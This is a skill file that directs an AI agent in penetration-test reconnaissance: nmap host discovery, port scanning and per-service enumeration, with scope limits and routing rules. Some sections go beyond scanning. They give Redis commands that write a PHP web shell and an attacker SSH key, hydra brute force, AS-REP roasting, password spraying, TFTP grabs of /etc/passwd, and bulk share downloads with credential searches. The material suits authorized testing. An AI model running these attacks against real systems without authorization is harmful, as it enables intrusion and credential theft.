---
name: network-recon
description: >
  Network reconnaissance, host discovery, port scanning, and service
  enumeration.
keywords:
  - scan this network
  - nmap
  - port scan
  - enumerate services
  - host discovery
  - recon this target
  - what's running on this host
  - service enumeration
  - network scan
  - find open ports
  - scan this IP
  - scan this subnet
  - enumerate this box
tools:
  - nmap
  - nuclei
  - httpx
  - NetExec
  - enum4linux-ng
  - MANSPIDER
  - snmpwalk
  - onesixtyone
opsec: medium
---

# Network Reconnaissance

You are helping a penetration tester perform network reconnaissance and service
enumeration. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[network-recon] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

Do NOT write to `engagement/activity.md`, `engagement/findings.md`, or
engagement state. The orchestrator maintains these files. Report all findings
in your return summary.

## Scope Boundary

This skill covers network reconnaissance — host discovery, port scanning,
service enumeration, and initial attack surface mapping. When you reach the
boundary of this scope — whether through a routing instruction ("Route to
**skill-name**") or by discovering findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Recommended next skill (the bold **skill-name** from routing instructions)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

You MUST NOT:
- Perform web application testing (directory fuzzing, parameter testing, IDOR,
  injection) — route to **web-discovery**
- Perform AD enumeration beyond initial domain identification — route to
  **ad-discovery**
- Perform privilege escalation enumeration or exploitation — route to
  **linux-discovery** or **windows-discovery**
- Extract or use credentials from captured traffic or files — update state.md
  and return to the orchestrator
- Establish SSH/WinRM/shell sessions for post-exploitation — update state.md
  with credentials and return to the orchestrator

When you find credentials, access, or confirmed vulns: update state.md, log to
activity.md, and present routing recommendations. Do not continue past recon.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

**Do NOT write engagement state.** When your work is complete, report all
findings clearly in your return summary. The orchestrator parses your summary
and records state changes. Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)
- **SMB share access table** (if SMB ports open): mandatory per-share results
  table from Step 4 of the SMB section. Every discovered share must have a row
  with tested access status. Never report a share as denied without testing it.
- **Account lockout policy** (if enumerable via null session or guest access):
  lockout threshold, observation window, lockout duration, min password length,
  complexity requirements. The orchestrator needs this before routing to
  password-spraying. Include even if threshold is 0 (no lockout).

## Prerequisites

- Network access to target(s) — direct or via pivot
- Target IP, hostname, or CIDR range
- Scope confirmation (which IPs/ranges are authorized)
- nmap installed (core tool — all other tools optional)

## Privileged Commands

Claude Code cannot execute `sudo` commands directly. Nmap requires root for SYN
scans, UDP scans, OS detection, and most NSE scripts. How nmap runs depends on
whether the nmap MCP server is available.

### MCP nmap Server (Subagent Mode)

When running as a subagent with nmap MCP access, use the `nmap_scan` tool
directly — no sudo handoff needed. The MCP server runs `sudo nmap` in a
subprocess and returns parsed JSON.

```
nmap_scan(target="10.10.10.5", options="-A -p- -T4")
```

- Returns structured JSON: hosts, ports, services, scripts, OS detection.
- Raw XML is saved to `engagement/evidence/` automatically.
- Use `get_scan(scan_id)` to retrieve previous results.
- The **Nmap Is the Gate** principle still applies — do not run other network
  tools until `nmap_scan` completes and you've parsed the results.

### Handoff Protocol (Inline Mode)

When running inline without nmap MCP access, hand off to the user for manual
execution. This applies to:

- **nmap** — SYN scans (`-sS`), UDP scans (`-sU`), OS detection (`-O`), and most NSE scripts that need raw sockets
- **responder** — LLMNR/NBNS/mDNS poisoning (requires raw sockets)
- **mount** — NFS/SMB mounting

**Handoff protocol:**

1. Present the full command including `sudo` to the user
2. Specify the output file path (ensure commands include `-oA`, `-oG`, or `-oL` flags)
3. Ask the user to run it in their terminal
4. Read the output file when the user confirms completion
5. Continue analysis based on the parsed output

**nmap always requires either MCP or the handoff protocol.** Do not run nmap
directly from Bash — not even non-privileged scan types like `-sT` or `-sV`.
Unprivileged nmap produces unreliable results (connect scans miss filtered
ports, no OS detection, no raw-socket NSE scripts).

### Nmap Is the Gate — Hard Stop

**After starting an nmap scan (via MCP or handoff), STOP. Do nothing else until
scan results are available.** No httpx, no curl, no netexec, no nuclei, no
"quick triage" — nothing touches the network until nmap results are parsed.
This applies in both guided and autonomous modes.

The nmap scan is the foundation. Every subsequent decision — which services to
enumerate, which skills to route to, which quick wins to check — depends on
knowing the full port and service landscape. Running tools before nmap completes
wastes time on assumptions, produces duplicate traffic, and risks missing the
ports that actually matter.

**Autonomous mode does not bypass this gate.** Autonomous means you make
decisions without asking — it does not mean you fill wait time with speculative
network traffic.

**Non-privileged commands** that CAN be executed directly by Claude for
**post-scan** service enumeration (only AFTER nmap results are parsed):
- `httpx`, `netexec`, `nuclei`, `whatweb`, `ffuf`
- `ldapsearch`, `smbclient`, `rpcclient`, `snmpwalk`

**Autonomous mode:** Batch all pending privileged commands so the user can run
them in one pass. Present them as a numbered list, each with its output file path.

## Step 1: Host Discovery

Identify live hosts in the target range. Skip for single-host targets.

```bash
# ARP ping (fastest — same subnet only)
sudo nmap -sn -PR 10.10.10.0/24 -oG discovery.gnmap

# ICMP echo + TCP SYN(80,443) + TCP ACK(80) + ICMP timestamp (default -sn)
sudo nmap -sn 10.10.10.0/24 -oG discovery.gnmap

# TCP-only host discovery (ICMP blocked)
sudo nmap -sn -PS22,80,135,443,445,3389,8080 10.10.10.0/24 -oG discovery.gnmap

# UDP host discovery
sudo nmap -sn -PU53,161,137 10.10.10.0/24 -oG discovery.gnmap

# Combined — most thorough
sudo nmap -sn -PE -PP -PS21,22,25,80,113,135,443,445,3389,8080 -PU53,111,137,161 10.10.10.0/24 -oG discovery.gnmap
```

**Parse live hosts for next steps:**

```bash
# Extract live hosts from nmap greppable output
grep "Status: Up" discovery.gnmap | awk '{print $2}' > live_hosts.txt
```

**In guided mode**, present the list of live hosts. Ask which to scan further
or proceed with all.

## Step 2: Port Scanning

Check the orchestrator's prompt for a `Scan type:` directive. This tells you
what the operator chose:

- **`quick`** — top 1000 ports + service detection:
  ```bash
  sudo nmap -sV -sC --top-ports 1000 -T4 -oA scan_HOSTNAME -vvv TARGET_IP
  ```

- **`full`** (or no directive) — all 65535 ports, full enumeration:
  ```bash
  sudo nmap -A -p- -T4 -oA scan_HOSTNAME -vvv TARGET_IP
  ```

- **`Custom scan request: ...`** — the operator described a custom scan.
  Translate their description into appropriate nmap options. Preserve `-oA`
  for output and add `-vvv` for verbose results.

If no scan type is specified, default to **full scan**.

The full scan is the go-to for most engagements. `-A` enables OS detection,
version detection, script scanning, and traceroute. `-p-` scans all 65535
ports. `-T4` is aggressive timing suitable for most networks. `-oA` saves in
all formats (`.nmap`, `.gnmap`, `.xml`).

**Parse scan results:**

```bash
# Extract open ports from greppable output
grep "open" scan_HOSTNAME.gnmap | awk -F'[/ ]' '{for(i=1;i<=NF;i++) if($i=="open") print $(i-1)}' | sort -un

# Parse nmap XML (useful for piping to other tools)
xmlstarlet sel -t -m "//port[state/@state='open']" -v "@portid" -o ":" -v "service/@name" -n scan_HOSTNAME.xml
```

## Step 3: Service Enumeration — Per-Port Quick Wins

After port scanning, enumerate each discovered service. This section is organized
by port with quick-win checks that often yield immediate access.

### FTP — Port 21

```bash
# Anonymous login check
nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-syst TARGET_IP

# Manual anonymous check
ftp TARGET_IP
# login: anonymous / anonymous@

# Brute force (if warranted)
hydra -L users.txt -P passwords.txt ftp://TARGET_IP -t 4
```

**Quick wins:** Anonymous login with write access, writable web root, config files
with credentials, ProFTPD `mod_copy` (CVE-2019-12815), vsftpd 2.3.4 backdoor.

### SSH — Port 22

```bash
# Version and auth methods
nmap -sV -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods TARGET_IP

# Check for password auth (vs key-only)
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 root@TARGET_IP 2>&1

# User enumeration (OpenSSH < 7.7 — CVE-2018-15473)
# Use auxiliary/scanner/ssh/ssh_enumusers in Metasploit
```

**Quick wins:** Default creds, key reuse from other hosts, CVE-2018-15473 user enum,
CVE-2024-6387 (regreSSHion — OpenSSH 8.5p1-9.7p1 on glibc systems).

### SMTP — Port 25/465/587

```bash
nmap -sV -p25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* TARGET_IP

# User enumeration via VRFY/RCPT
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t TARGET_IP
smtp-user-enum -M EXPN -U users.txt -t TARGET_IP
```

**Quick wins:** Open relay, user enumeration, NTLM auth info leak
(`MAIL FROM:<> AUTH NTLM` reveals internal hostname/domain).

### DNS — Port 53

```bash
nmap -sV -p53 --script dns-zone-transfer,dns-cache-snoop,dns-nsid TARGET_IP

# Zone transfer
dig axfr @TARGET_IP target.com
host -l target.com TARGET_IP

# Reverse DNS sweep
dnsrecon -r 10.10.10.0/24 -n TARGET_IP

# Subdomain brute force
dnsenum --dnsserver TARGET_IP --enum target.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Quick wins:** Zone transfer (full DNS dump), wildcard records, internal hostnames.

### HTTP/HTTPS — Ports 80, 443, 8080, 8443

```bash
# HTTP enumeration
nmap -sV -p80,443,8080,8443 --script http-title,http-headers,http-methods,http-robots.txt,http-enum TARGET_IP

# Quick tech stack identification
whatweb TARGET_IP
httpx -u TARGET_IP -ports 80,443,8080,8443 -title -tech-detect -status-code -follow-redirects

# Screenshot for visual triage (multiple hosts)
gowitness single TARGET_URL
```

**Quick wins:** Default credentials on management interfaces, exposed admin panels,
directory listing enabled, `.git` or `.svn` directory exposed, phpinfo(),
server-status/server-info.

→ STOP. Return to orchestrator recommending **web-discovery**. Pass: target URL,
tech stack, any interesting headers. Do not execute ffuf or web fuzzing commands
inline.

### Kerberos — Port 88

```bash
nmap -sV -p88 --script krb5-enum-users TARGET_IP

# Enumerate valid usernames
kerbrute userenum -d DOMAIN --dc TARGET_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting (no creds needed)
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -outputfile asrep_hashes.txt
```

**Quick wins:** AS-REP roastable accounts, valid username enumeration.
→ STOP. Return to orchestrator recommending **ad-discovery**. Pass: DC IP,
domain name, any creds. Do not execute AD enumeration commands inline.

### RPC/MSRPC — Ports 111, 135

```bash
# Linux RPC
rpcinfo -p TARGET_IP
showmount -e TARGET_IP  # NFS shares

# Windows RPC
rpcclient -U "" -N TARGET_IP
rpcclient -U "" -N TARGET_IP -c "enumdomusers;enumdomgroups;getdompwinfo"
rpcdump.py TARGET_IP | grep -E "Protocol|Provider"
```

**Quick wins:** Null session user enumeration, NFS shares with no_root_squash,
MSRPC endpoint map revealing services.

### SMB — Ports 139, 445

**Run ALL of the following tools in sequence — not just one.** SMB tools use
different RPC calls and authentication methods under the hood. A failure or
partial result from one tool does NOT mean the others will also fail. NetExec
might return `STATUS_USER_SESSION_DELETED` while `smbclient -L` succeeds, or
vice versa. You must try every tool before concluding that SMB enumeration
has failed.

**Step 1 — Share listing (run ALL, regardless of earlier results):**

```bash
# Tool 1: smbclient null session share listing
smbclient -N -L //TARGET_IP/

# Tool 2: NetExec null session + guest
netexec smb TARGET_IP -u '' -p '' --shares
netexec smb TARGET_IP -u 'guest' -p '' --shares

# Tool 3: enum4linux-ng comprehensive enumeration
enum4linux-ng -A TARGET_IP
```

**Step 2 — Password/lockout policy (run with both null and guest):**

```bash
netexec smb TARGET_IP -u '' -p '' --pass-pol
netexec smb TARGET_IP -u 'guest' -p '' --pass-pol
```

**Step 3 — User and vuln enumeration via NSE:**

```bash
nmap -sV -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* TARGET_IP
```

**Step 4 — Enumerate EVERY discovered share (mandatory, no exceptions).**

This step is NOT optional. The agent MUST test every share individually with
`smbclient`. Access denied on one share tells you NOTHING about other shares —
Windows ACLs are per-share. Skipping a share is a methodology failure.

For EVERY share discovered in Step 1 (from ANY tool), run:

```bash
smbclient //TARGET_IP/SHARENAME -N -c 'ls' 2>&1
```

If `ls` succeeds (shows files/directories), the share is readable. Follow up:

```bash
# Recursive listing of accessible share
smbclient //TARGET_IP/SHARENAME -N -c 'recurse ON; prompt OFF; ls'

# Download interesting files (configs, scripts, credentials, backups)
smbclient //TARGET_IP/SHARENAME -N -c 'recurse ON; prompt OFF; mget *'
```

**Per-share results table (mandatory in return summary).** You MUST include
this table in your return summary. Every share from Step 1 must have a row.
No share may be listed as "not tested" or "needs testing" — test it or explain
why the test command failed.

```
| Share | Access | Method | Contents/Notes |
|-------|--------|--------|----------------|
| ADMIN$ | DENIED | smbclient -N | NT_STATUS_ACCESS_DENIED |
| C$ | DENIED | smbclient -N | NT_STATUS_ACCESS_DENIED |
| Development | READ | smbclient -N | Automation/ directory found |
| IPC$ | LIMITED | smbclient -N | IPC only, no file listing |
| NETLOGON | READ | smbclient -N | Empty or standard scripts |
| SYSVOL | READ | smbclient -N | Policies, scripts |
```

**Rules:**
- "Access" must be one of: `READ`, `WRITE`, `DENIED`, `LIMITED`, `ERROR`
- "Method" must show the actual command used (e.g., `smbclient -N`, `netexec guest`)
- Never report a share as DENIED unless you received `NT_STATUS_ACCESS_DENIED`
  (or similar error) from testing THAT SPECIFIC share
- Never infer access status from other shares — test each one individually
- If `smbclient` hangs or times out on a share, report as `ERROR` with details

**Step 5 — Fallback: probe common share names directly.** Only if ALL listing
tools in Step 1 failed. Some Windows configurations block null-session share
*listing* but allow null-session *access* to individual shares:

```bash
for share in ADMIN$ C$ IPC$ SYSVOL NETLOGON Development Users Backups Public Data IT HR Finance Software Shared Docs; do
    echo "--- $share ---"
    smbclient //TARGET_IP/"$share" -N -c 'ls' 2>&1 | head -20
done
```

**Step 6 — Content search with MANSPIDER.** After identifying accessible shares,
search file contents for credentials, configs, and sensitive data. MANSPIDER
crawls SMB shares and greps file contents (including Office docs, PDFs, and
archives) without downloading everything.

```bash
# Search all shares on target for passwords and credentials
manspider TARGET_IP -c password passwd cred secret
manspider TARGET_IP -c connectionstring server= uid= pwd=

# Search with regex for common credential patterns
manspider TARGET_IP -e '(password|passwd|pwd)\s*[=:]\s*\S+'
manspider TARGET_IP -e '(api[_-]?key|token)\s*[=:]\s*\S+'

# Limit to specific file types (configs, scripts, office docs)
manspider TARGET_IP -e 'password' -f xml conf config ini txt ps1 bat vbs

# With credentials (if available from earlier enumeration)
manspider TARGET_IP -u 'user' -p 'Password123' -d DOMAIN -c password secret
```

Only run MANSPIDER after the share access table is complete — it needs at least
one readable share to be useful. If all shares returned DENIED, skip this step.

**Quick wins:** Null session (user enum, share listing), guest access to shares,
writable shares (web root, SYSVOL), EternalBlue (MS17-010), SMBGhost
(CVE-2020-0796), PrintNightmare.

**Password/lockout policy:** If null session or guest `--pass-pol` succeeds,
record the full policy in your return summary. The orchestrator needs this
before routing to password-spraying. Key values: lockout threshold (0 = no
lockout — critical for spray decisions), observation window, lockout duration,
min password length, complexity requirements.

→ STOP. Return to orchestrator recommending **ad-discovery**. Pass: DC IP,
domain name, any credentials or null session access. Do not execute AD commands
inline.

### LDAP — Ports 389, 636, 3268

```bash
# Anonymous LDAP query
ldapsearch -x -H ldap://TARGET_IP -b "" -s base namingContexts
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# Nmap LDAP scripts
nmap -sV -p389,636,3268 --script ldap-rootdse,ldap-search TARGET_IP
```

**Quick wins:** Anonymous bind with full directory read, password in description
field, domain info disclosure via rootDSE.

→ STOP. Return to orchestrator recommending **ad-discovery**. Pass: DC IP,
domain name from rootDSE, any anonymous bind results. Do not execute LDAP
enumeration inline.

### MSSQL — Port 1433

```bash
nmap -sV -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info TARGET_IP

# Auth check
mssqlclient.py sa:password@TARGET_IP
netexec mssql TARGET_IP -u sa -p '' --local-auth  # Empty password check

# NTLM info leak
nmap -p1433 --script ms-sql-ntlm-info TARGET_IP
```

**Quick wins:** `sa` with empty/default password, NTLM info leak (domain/hostname),
xp_cmdshell enabled.

### Oracle — Port 1521

```bash
nmap -sV -p1521 --script oracle-sid-brute,oracle-tns-version TARGET_IP

# SID enumeration
odat sidguesser -s TARGET_IP
hydra -L sids.txt -s 1521 TARGET_IP oracle-sid

# Default credential check
odat all -s TARGET_IP -p 1521
```

**Quick wins:** Default SIDs (XE, ORCL, PROD), default creds
(SCOTT/TIGER, SYS/CHANGE_ON_INSTALL, SYSTEM/MANAGER).

### MySQL — Port 3306

```bash
nmap -sV -p3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-vuln* TARGET_IP

# Auth check
mysql -h TARGET_IP -u root -p''  # Empty root password
mysql -h TARGET_IP -u root       # No password at all
```

**Quick wins:** Root with empty password, remote root login enabled, UDF for
command execution.

### RDP — Port 3389

```bash
nmap -sV -p3389 --script rdp-ntlm-info,rdp-enum-encryption TARGET_IP

# NTLM info leak (hostname, domain, FQDN)
nmap -p3389 --script rdp-ntlm-info TARGET_IP

# NLA check
nmap -p3389 --script rdp-enum-encryption TARGET_IP

# BlueKeep check (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP
```

**Quick wins:** NTLM info leak, BlueKeep (CVE-2019-0708 — Windows 7/2008R2),
NLA disabled (brute force viable), screenshot via `xfreerdp`.

### PostgreSQL — Port 5432

```bash
nmap -sV -p5432 --script pgsql-brute TARGET_IP

# Default creds
psql -h TARGET_IP -U postgres -d postgres
```

**Quick wins:** `postgres` with empty/default password, trust authentication
(no password needed).

### WinRM — Ports 5985, 5986

```bash
netexec winrm TARGET_IP -u USER -p PASSWORD

# Check if WinRM is available
nmap -sV -p5985,5986 TARGET_IP
```

**Quick wins:** Valid domain creds = remote PowerShell. Check with any discovered
credentials.

### Redis — Port 6379

```bash
nmap -sV -p6379 --script redis-info TARGET_IP

# Unauthenticated access
redis-cli -h TARGET_IP info
redis-cli -h TARGET_IP config get *

# RCE via webshell write
redis-cli -h TARGET_IP
> config set dir /var/www/html/
> config set dbfilename shell.php
> set payload "<?php system($_GET['cmd']); ?>"
> save

# RCE via SSH key write
redis-cli -h TARGET_IP
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set payload "\n\nssh-ed25519 AAAA... attacker@host\n\n"
> save
```

**Quick wins:** No authentication (default), webshell write to web root,
SSH key injection, `SLAVEOF` replication RCE.

### MongoDB — Port 27017

```bash
nmap -sV -p27017 --script mongodb-info,mongodb-databases TARGET_IP

# Unauthenticated access
mongosh --host TARGET_IP --eval "show dbs"
mongosh --host TARGET_IP --eval "db.adminCommand({listDatabases:1})"
```

**Quick wins:** No authentication, direct database access, credential dump.

### SNMP — Ports 161/162 (UDP)

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP

# Walk with found community string
snmpwalk -v2c -c public TARGET_IP .1
snmpwalk -v2c -c public TARGET_IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# Bulk walk for speed
snmpbulkwalk -v2c -c public TARGET_IP .1 > snmp_full_dump.txt

# Specific OIDs
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.6.13.1.3    # TCP connections
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

**Quick wins:** Default `public`/`private` community strings, user enumeration,
running process list, installed software, network interfaces, Net-SNMP Extend RCE.

### IPMI — Port 623 (UDP)

```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero TARGET_IP

# Hash dump (cipher zero vulnerability)
ipmitool -I lanplus -H TARGET_IP -U "" -P "" user list
# Metasploit: auxiliary/scanner/ipmi/ipmi_dumphashes
```

**Quick wins:** Cipher 0 (auth bypass), default creds (admin/admin, ADMIN/ADMIN),
RAKP hash disclosure (offline cracking).

### NFS — Port 2049

```bash
showmount -e TARGET_IP
nmap -sV -p2049 --script nfs-ls,nfs-showmount,nfs-statfs TARGET_IP

# Mount and explore
sudo mount -t nfs TARGET_IP:/share /mnt/nfs -o nolock
ls -la /mnt/nfs/
```

**Quick wins:** World-readable shares, writable shares (SUID binary plant),
no_root_squash (root file injection).

### TFTP — Port 69 (UDP)

```bash
nmap -sU -p69 --script tftp-enum TARGET_IP

# Grab common files
tftp TARGET_IP -c get /etc/passwd
tftp TARGET_IP -c get running-config
tftp TARGET_IP -c get startup-config
```

**Quick wins:** Open TFTP with config files, credential files, firmware downloads.

### VNC — Ports 5900-5910

```bash
nmap -sV -p5900-5910 --script vnc-info,vnc-brute TARGET_IP

# Auth check
vncviewer TARGET_IP::5900
```

**Quick wins:** No authentication, weak passwords, CVE-2006-2369 (auth bypass).

## Step 4: OS Fingerprinting

If `-A` didn't provide reliable OS detection:

```bash
# Aggressive OS detection
sudo nmap -O --osscan-guess -oA os_HOSTNAME TARGET_IP

# TCP/IP stack fingerprinting
sudo nmap -O -sV --version-intensity 5 -oA os_HOSTNAME TARGET_IP
```

**Quick heuristics from open ports:**

| Signature | Likely OS |
|-----------|-----------|
| 135, 139, 445, 3389 | Windows |
| 22, 111, 2049 | Linux/Unix |
| 22, 80/443 only | Linux (hardened/web server) |
| 88, 389, 445, 636, 3268 | Domain Controller |
| 5985, 5986 | Windows (WinRM enabled) |
| 548 (AFP) | macOS |

**TTL heuristics (from ping or nmap):**

| TTL Range | Likely OS |
|-----------|-----------|
| 64 | Linux/macOS |
| 128 | Windows |
| 254-255 | Network device (Cisco, etc.) |

## Step 5: Vulnerability Scanning

After service enumeration, run targeted vulnerability checks.

**Nmap NSE vulnerability scripts:**

```bash
# Safe vulnerability checks
sudo nmap -sV --script vuln -p OPEN_PORTS -oA vuln_HOSTNAME TARGET_IP

# Specific vulnerability categories
sudo nmap -sV --script "smb-vuln*" -p445 -oA vuln_HOSTNAME TARGET_IP
sudo nmap -sV --script "http-vuln*" -p80,443 -oA vuln_HOSTNAME TARGET_IP
```

**Nuclei (template-based scanning):**

```bash
# Update templates
nuclei -update-templates

# Full scan
nuclei -u http://TARGET_IP -o nuclei_results.txt

# Specific severity
nuclei -u http://TARGET_IP -severity critical,high -o nuclei_critical.txt

# Technology-specific
nuclei -u http://TARGET_IP -tags cve,misconfig -o nuclei_cve.txt

# Network-level (non-HTTP)
nuclei -target TARGET_IP -t network/ -o nuclei_network.txt
```

**Service-specific vulnerability checks:**

```bash
# EternalBlue (MS17-010)
nmap -p445 --script smb-vuln-ms17-010 TARGET_IP

# BlueKeep (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP

# Log4Shell probe (HTTP services)
nuclei -u http://TARGET_IP -tags log4j

# Heartbleed
nmap -p443 --script ssl-heartbleed TARGET_IP
```

## Step 6: Multi-Host Workflows

For engagements with multiple targets or subnets.

**Scan pipeline:**

```bash
# 1. Discover live hosts
sudo nmap -sn -PE -PS22,80,135,443,445 10.10.10.0/24 -oG discovery.gnmap
grep "Status: Up" discovery.gnmap | awk '{print $2}' > live_hosts.txt

# 2. Quick port scan all hosts
sudo nmap -sS --top-ports 1000 -T4 -iL live_hosts.txt -oA quick_scan -vvv

# 3. Full scan on interesting hosts
sudo nmap -A -p- -T4 -iL priority_hosts.txt -oA full_scan -vvv

# 4. Service-specific enumeration
netexec smb live_hosts.txt --shares
netexec smb live_hosts.txt -u '' -p '' --shares
```

**HTTP service discovery across multiple hosts:**

```bash
# Find all HTTP services
cat full_scan.gnmap | grep -oP '\d+/open/tcp//http' | sort -u
httpx -l live_hosts.txt -ports 80,443,8080,8443,8000,3000,5000,9090 -title -tech-detect -status-code -o http_services.txt
```

**NetExec for Windows/AD sweep:**

```bash
# SMB signing check (identifies relay targets)
netexec smb live_hosts.txt --gen-relay-list relay_targets.txt

# Password spray (after finding a valid password)
netexec smb live_hosts.txt -u USER -p PASSWORD
netexec winrm live_hosts.txt -u USER -p PASSWORD
netexec mssql live_hosts.txt -u USER -p PASSWORD
```

## Step 7: Output Parsing and State Update

After scanning, parse results into structured form for state management and
next-step routing.

**Parse nmap XML for structured data:**

```bash
# List all hosts with open ports (from XML)
xmlstarlet sel -t -m "//host[ports/port/state/@state='open']" \
  -v "address[@addrtype='ipv4']/@addr" -o " " \
  -m "ports/port[state/@state='open']" -v "@portid" -o "/" -v "service/@name" -o " " \
  -b -n scan_HOSTNAME.xml

# Quick summary
grep "Ports:" scan_HOSTNAME.gnmap | sed 's/Ports: //' | tr ',' '\n'
```

**Update state.md with scan results (format per-host one-liner):**

```
## Targets
- 10.10.10.1 | Windows Server 2019 | DC | 53,88,135,139,389,445,636,3268,3389,5985
- 10.10.10.5 | Ubuntu 22.04 | Web | 22,80,443
- 10.10.10.10 | Windows 10 | Workstation | 135,139,445,3389,5985
```

## Step 8: Routing Decision Tree

Based on recon findings, route to the appropriate technique or discovery skill.

### Web Services Found (HTTP/HTTPS)

Ports 80, 443, 8080, 8443, 8000, 3000, 5000, or any HTTP service identified.
→ STOP. Return to orchestrator recommending **web-discovery**. Pass: target URL,
technology stack, any interesting headers or responses noted during enumeration.
Do not execute web discovery commands inline.

### Domain Controller Identified

Ports 88 (Kerberos) + 389 (LDAP) + 445 (SMB) indicate an AD domain controller.
→ STOP. Return to orchestrator recommending **ad-discovery**. Pass: DC IP,
domain name (from LDAP rootDSE or SMB OS discovery), any credentials found.
Do not execute AD enumeration commands inline.

### Database Services Exposed

MSSQL (1433), MySQL (3306), PostgreSQL (5432), Oracle (1521), MongoDB (27017).
If credentials found or anonymous access confirmed, enumerate for command
execution or sensitive data.
- MSSQL: Check `xp_cmdshell`, linked servers, NTLM relay opportunity
- MySQL: Check UDF, `INTO OUTFILE`, `LOAD_FILE()`
- PostgreSQL: Check `COPY TO/FROM PROGRAM`
- MongoDB: Dump databases
- Oracle: Check for `DBMS_SCHEDULER`, Java execution

### SMB Shares Accessible

Writable shares, SYSVOL access, or null session enumeration successful.
→ If domain-joined: STOP. Return to orchestrator recommending **ad-discovery**.
  Pass: DC IP, domain, share access details.
→ Check for sensitive files (config files, credentials, scripts)

### Quick Wins Found

| Finding | Action |
|---------|--------|
| Anonymous FTP with write | Upload webshell if web root, or plant SUID binary |
| Redis unauthenticated | Webshell write or SSH key injection |
| NFS with no_root_squash | SUID binary plant → return to orchestrator recommending **linux-file-path-abuse** |
| SNMP default community | Extract users, processes, installed software |
| IPMI cipher 0 | Dump hashes → crack → access BMC |
| Default creds on any service | Use them, escalate |
| MS08-067 (CVE-2008-4250) | STOP. Return to orchestrator recommending **smb-exploitation**. Pass: target IP, OS, vuln confirmed |
| EternalBlue (MS17-010) | STOP. Return to orchestrator recommending **smb-exploitation**. Pass: target IP, OS, architecture, vuln confirmed |
| SMBGhost (CVE-2020-0796) | STOP. Return to orchestrator recommending **smb-exploitation**. Pass: target IP, OS build (must be v1903/v1909) |
| MS09-050 (CVE-2009-3103) | STOP. Return to orchestrator recommending **smb-exploitation**. Pass: target IP, OS (Vista/Server 2008 only) |
| BlueKeep (CVE-2019-0708) | Direct SYSTEM shell (unstable — no dedicated skill yet) |

### Internal Network from a Pivot

If running from a compromised host with access to a new subnet:
→ STOP. Return to orchestrator recommending **pivoting-tunneling** to set up
  access from attack machine. Then recommend **network-recon** on the new range.

### Multiple Attack Surfaces

In **guided** mode, present all findings ranked by exploitability:
1. Known CVEs with public exploits (EternalBlue, BlueKeep, Log4Shell)
2. Default/anonymous access (FTP, Redis, SNMP, NFS)
3. Web applications (→ return to orchestrator recommending **web-discovery**)
4. Domain services (→ return to orchestrator recommending **ad-discovery**)
5. Database services with access
6. IPMI/BMC access

In **autonomous** mode, pursue highest-value target first (Domain Controller >
web app with known vuln > database with creds > default service access).

When routing, pass along: target IP, open ports, identified services and versions,
OS, any credentials or access found, current mode.

## Troubleshooting

### Nmap scan runs slowly or hangs
- Use `-T4` for speed. Drop to `-T3` if getting rate-limited or missing ports.
- On large subnets, start with `--top-ports 1000` before doing `-p-`.
- If host seems down but you know it's up, add `-Pn` to skip host discovery.

### UDP scan takes too long
- UDP scans are inherently slow. Limit to key ports: `-sU -p 53,67,69,123,161,162,500,623,1434,5353`.
- Combine with TCP: `-sS -sU --top-ports 100`.

### Service version detection returns "tcpwrapped"
- Target is accepting TCP connections but dropping them before service negotiation.
- Try connecting manually: `nc -nv TARGET_IP PORT` to see if there's a banner.
- May indicate a firewall or IPS is interfering.

### Nmap XML parsing fails
- Ensure scan completed (check for `</nmaprun>` closing tag).
- If scan was interrupted, partial XML is unusable — re-run with `-oA` to get all formats.
